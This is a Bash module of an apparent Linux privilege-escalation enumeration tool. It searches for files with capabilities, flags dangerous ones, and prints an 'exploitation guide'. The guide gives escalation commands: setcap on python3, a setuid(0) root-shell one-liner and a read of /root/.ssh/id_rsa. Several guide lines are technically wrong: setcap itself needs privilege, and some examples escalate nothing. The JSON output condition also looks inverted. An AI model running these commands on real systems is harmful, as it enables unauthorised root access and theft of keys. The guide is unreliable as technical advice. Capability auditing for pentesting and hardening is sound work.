#!/bin/bash

source "$(dirname "${BASH_SOURCE[0]}")/../utils/helpers.sh"

DANGEROUS_CAPS="cap_setuid cap_setgid cap_sys_admin cap_dac_override cap_dac_read_search cap_fowner cap_chown cap_net_bind_service cap_net_admin cap_sys_ptrace"

CAP_EXPLOITS=(
    "cap_setuid:Any binary with cap_setuid can escalate to root"
    "cap_setgid:Any binary with cap_setgid can create SGID binaries"
    "cap_sys_admin:Full administrator privileges"
    "cap_dac_override:Bypass file read/write permissions"
    "cap_dac_read_search:Bypass file read permissions"
    "cap_fowner:Bypass file ownership restrictions"
    "cap_chown:Modify file ownership"
    "cap_net_bind_service:Bind to privileged ports"
    "cap_net_admin:Modify network configuration"
    "cap_sys_ptrace:Attach to and debug processes"
)

check_capabilities() {
    print_title "LINUX CAPABILITIES"
    
    if [[ -z "$GETCAP_CMD" ]]; then
        print_warn "getcap command not found"
        print_info "Install: apt-get install libcap2-bin"
    else
        print_info "Searching for files with capabilities..."
        
        local caps_output=$(getcap -r / 2>/dev/null)
        
        if [[ -z "$caps_output" ]]; then
            print_info "No files with capabilities found"
        else
            local dangerous_found=false
            
            print_subtitle "Files with capabilities:"
            
            while IFS= read -r line; do
                [[ -z "$line" ]] && continue
                
                local cap_file=$(echo "$line" | awk '{print $1}')
                local cap_perms=$(echo "$line" | awk '{print $2}')
                
                local is_dangerous=false
                local danger_type=""
                
                for cap_exploit in "${CAP_EXPLOITS[@]}"; do
                    local cap_name=$(echo "$cap_exploit" | cut -d: -f1)
                    local cap_desc=$(echo "$cap_exploit" | cut -d: -f2)
                    
                    if echo "$cap_perms" | grep -qi "$cap_name"; then
                        is_dangerous=true
                        danger_type="$cap_desc"
                        break
                    fi
                done
                
                if [[ "$is_dangerous" == "true" ]]; then
                    print_high "$line"
                    print_info "  → $danger_type"
                    
                    [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "capability" "high" "Dangerous capability: $cap_perms" "$cap_file - $danger_type" "N/A"
                else
                    print_info "$line"
                fi
                
            done <<< "$caps_output"
        fi
    fi
    
    echo ""
}

check_shell_capabilities() {
    print_title "SHELL CAPABILITIES"
    
    print_info "Current shell capabilities:"
    
    if [[ -n "$CAPSH_CMD" ]]; then
        local cap_eff=$(cat /proc/$$/status 2>/dev/null | grep CapEff | awk '{print $2}')
        if [[ -n "$cap_eff" ]]; then
            print_info "Effective capabilities: $cap_eff"
            print_info "Decoded: $(decode_capabilities "$cap_eff")"
        fi
    else
        cat /proc/$$/status 2>/dev/null | grep -i cap || print_warn "Cannot read capabilities"
    fi
    
    echo ""
}

check_writable_cap_files() {
    print_title "WRITABLE CAPABILITY FILES"
    
    if [[ -n "$GETCAP_CMD" ]]; then
        print_info "Checking for writable capability files..."
        
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            
            local cap_file=$(echo "$line" | awk '{print $1}')
            
            if [[ -w "$cap_file" ]]; then
                print_critical "WRITABLE capability file: $cap_file"
                print_warn "Can modify capabilities for privilege escalation"
                
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "capability" "critical" "Writable capability file" "$cap_file" "Modify capabilities to escalate"
                
                print_subtitle "Exploitation:"
                print_command "# Add dangerous capability to a binary"
                print_command "setcap cap_setuid+ep $cap_file"
                print_command "# Then run as non-root to get root"
            fi
        done <<< "$(getcap -r / 2>/dev/null)"
    fi
    
    echo ""
}

explain_capabilities() {
    print_title "CAPABILITY EXPLOITATION GUIDE"
    
    print_subtitle "Common dangerous capabilities:"
    
    print_info "cap_setuid + ep"
    print_warn "  Allows setting UID to 0 (root)"
    print_command "setcap cap_setuid+ep /usr/bin/python3.9"
    print_command "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
    print ""
    
    print_info "cap_sys_admin + ep"
    print_warn "  Full administrator capabilities"
    print_command "setcap cap_sys_admin+ep /usr/bin/python3.9"
    print_command "python3 -c 'import os; os.system(\"/bin/sh\")'"
    print ""
    
    print_info "cap_dac_override + ep"
    print_warn "  Bypasses file permission checks"
    print_command "# Can read any file regardless of permissions"
    print_command "setcap cap_dac_override+ep /usr/bin/python3.9"
    print_command "python3 -c 'open(\"/root/.ssh/id_rsa\").read()'"
    print ""
    
    print_info "cap_fowner + ep"
    print_warn "  Bypasses file ownership checks"
    print_command "# Can modify any file"
    print_command "setcap cap_fowner+ep /usr/bin/python3.9"
    print ""
    
    print_info "cap_sys_ptrace + ep"
    print_warn "  Can attach to and debug processes"
    print_command "# Read process memory (credentials, etc.)"
    print_command "setcap cap_sys_ptrace+ep /usr/bin/python3.9"
    print_command "python3 -c 'import os; os.system(\"ps aux | grep root\")'"
    print ""
    
    print_link "Linux Capabilities" "https://man7.org/linux/man-pages/man7/capabilities.7.html"
    print_link "GTFOBins Capabilities" "https://gtfobins.github.io/#+capabilities"
    
    echo ""
}

run_capability_checks() {
    check_capabilities
    check_shell_capabilities
    check_writable_cap_files
    explain_capabilities
}
